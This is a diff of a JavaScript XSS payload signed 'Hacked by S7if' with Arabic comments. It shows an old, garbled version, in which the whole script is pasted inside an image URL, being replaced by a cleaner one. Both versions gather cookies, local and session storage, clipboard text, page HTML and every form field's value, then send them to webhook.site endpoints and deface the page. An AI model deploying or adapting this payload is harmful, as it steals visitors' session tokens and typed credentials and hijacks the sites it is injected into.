@@ -1,18 +1,19 @@
 <script>
-alert("💀 Hacked by S7if 💀");
+(async () => {
+  // ⛔ عرض alert أولاً
+  alert("💀 Hacked by S7if 💀");
 
-// بعد ما يدوس OK أو يضغط في أي مكان
-window.addEventListener("click", async () => {
-  const data = {
+  // 🧠 جمع البيانات
+  const everything = {
     cookies: document.cookie,
-    localStorage: {...localStorage},
-    sessionStorage: {...sessionStorage},
+    localStorage: { ...localStorage },
+    sessionStorage: { ...sessionStorage },
     url: location.href,
     referrer: document.referrer,
     userAgent: navigator.userAgent,
     platform: navigator.platform,
+    clipboard: "",
     html: document.documentElement.outerHTML.slice(0, 3000),
-    clipboard: "Access denied",
     forms: Array.from(document.forms).map(f => ({
       action: f.action,
       method: f.method,
@@ -27,67 +28,25 @@ window.addEventListener("click", async () => {
 
   // محاولة قراءة الكليب بورد
   try {
-    data.clipboard = await navigator.clipboard.readText();
+    everything.clipboard = await navigator.clipboard.readText();
   } catch (e) {
-    data.clipboard = "Clipboard access denied";
+    everything.clipboard = "Clipboard access denied";
   }
 
-  // إرسال البيانات إلى Webhook عن طريق GET bypass (صورة)
-  const img = new Image();
-  img.src = "<script>
-alert("💀 Hacked by S7if 💀");
-
-// بعد ما يدوس OK أو يضغط في أي مكان
-window.addEventListener("click", async () => {
-  const data = {
-    cookies: document.cookie,
-    localStorage: {...localStorage},
-    sessionStorage: {...sessionStorage},
-    url: location.href,
-    referrer: document.referrer,
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    html: document.documentElement.outerHTML.slice(0, 3000),
-    clipboard: "Access denied",
-    forms: Array.from(document.forms).map(f => ({
-      action: f.action,
-      method: f.method,
-      fields: Array.from(f.elements).map(e => ({
-        name: e.name,
-        type: e.type,
-        value: e.value
-      }))
-    })),
-    time: new Date().toISOString()
-  };
-
-  // محاولة قراءة الكليب بورد
+  // إرسال البيانات للويب هوك
   try {
-    data.clipboard = await navigator.clipboard.readText();
-  } catch (e) {
-    data.clipboard = "Clipboard access denied";
-  }
+    await fetch("https://webhook.site/3dd75195-9a2f-4eb2-90e4-a036f13bdd9b", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(everything)
+    });
+  } catch (e) {}
 
-  // إرسال البيانات إلى Webhook عن طريق GET bypass (صورة)
-  const img = new Image();
-  img.src = "https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb?" +
-    "data=" + encodeURIComponent(JSON.stringify(data));
+  // بعد ما يضغط OK في alert، نعرض رسالة نصية بسيطة بدل الصفحة بالكامل
   document.body.innerHTML = `
-    <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:black;flex-direction:column">
-      <h1 style="color:red;font-size:2.5em">👾 Hacked by Saif 👾</h1>
-      <img src="${img.src}" style="display:none;">
-      <img src="https://i.imgur.com/DUzWv9M.gif" style="width:300px; margin-top:20px;" />
+    <div style="padding: 20px; font-family: monospace; color: #0f0; background: #111; height: 100vh; display: flex; justify-content: center; align-items: center; font-size: 2em;">
+      Saif
     </div>
   `;
-});
-</script>?" +
-    "data=" + encodeURIComponent(JSON.stringify(data));
-  document.body.innerHTML = `
-    <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:black;flex-direction:column">
-      <h1 style="color:red;font-size:2.5em">👾 Hacked by Saif 👾</h1>
-      <img src="${img.src}" style="display:none;">
-      <img src="https://i.imgur.com/DUzWv9M.gif" style="width:300px; margin-top:20px;" />
-    </div>
-  `;
-});
+})();
 </script>
